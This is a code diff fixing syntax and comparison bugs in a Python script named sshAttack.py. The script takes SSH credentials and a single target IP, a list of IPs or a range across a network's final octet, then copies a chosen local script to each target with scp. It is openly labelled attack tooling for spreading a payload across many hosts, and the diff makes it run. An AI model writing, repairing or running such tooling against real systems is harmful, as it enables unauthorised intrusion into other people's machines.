@@ -4,10 +4,10 @@ import subprocess
 
 def main():
     option=""
-    if(len(sys.argv) != 4:
+    if(len(sys.argv) != 4):
         print("Usage: sshAttack.py {path to local script} {path to send to} {config: 1(single target), 2(list of targets), 3(range of targets)}")
     else:
-        if(sys.argv[3] == 1):
+        if(sys.argv[3] == "1"):
             target=input("Enter target IP: ")
             localPath=sys.argv[1] #PATH TO SUBJECT SCRIPT ON LOCAL MACHINE
             remotePath=sys.argv[2] #PATH TO SUBJECT SCRIPT ON TARGET MACHINE
@@ -23,12 +23,12 @@ def main():
                 password=option
             attack(localPath, remotePath, target, user, password)
             
-        elif(sys.argv[3] == 2):
+        elif(sys.argv[3] == "2"):
             targetList=[]
             cont=True
             while(cont):
                 option=input("Enter target IP('q' to stop entering): ")
-                if(option.lower() in ('q'):
+                if(option.lower() in ('q')):
                     cont=False
                 else:
                     targetList.append(option)
@@ -50,7 +50,7 @@ def main():
             for target in targetList:
                 attack(localPath, remotePath, target, user, password)
             
-        elif(sys.argv[3] == 3):
+        elif(sys.argv[3] == "3"):
             prefix=input("Enter address prefix of target network: ") #PREFIX OF TARGET NETWORK
             highestNum=input("Enter highest value of the final octet: ") #HIGHEST VALUE OF FINAL OCTET
             lowestNum=input("Enter lowest value of the final octet: ") #LOWEST VALUE OF FINAL OCTET
@@ -76,7 +76,7 @@ def main():
         
         print("Attack finished")
     
-def attack(localPath, remotePath, remoteHost, remoteUser, remotePass):
+def attack(local_script_path, remote_script_path, remote_host, remote_user, remote_password):
     try:
         # Use SCP to copy the local script to the remote machine
         scp_command = f'scp {local_script_path} {remote_user}@{remote_host}:{remote_script_path}'
